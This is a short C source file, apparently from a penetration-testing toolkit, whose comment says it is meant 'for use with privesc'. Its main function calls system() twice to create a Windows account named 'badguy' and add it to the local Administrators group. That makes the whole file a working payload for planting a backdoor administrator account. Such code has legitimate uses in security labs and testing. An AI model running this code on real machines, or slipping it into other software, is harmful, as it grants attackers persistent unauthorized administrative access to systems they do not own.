// useradd.c - 09-16-16, Joe Graham
// Basic code to add a user and make them an admin in
// Windows. For use with privesc.

#include <stdlib.h>

int main() {
    int i;
    i = system("net user badguy /add");
    i = system("net localgroup administrators badguy /add");
    return 0;
}
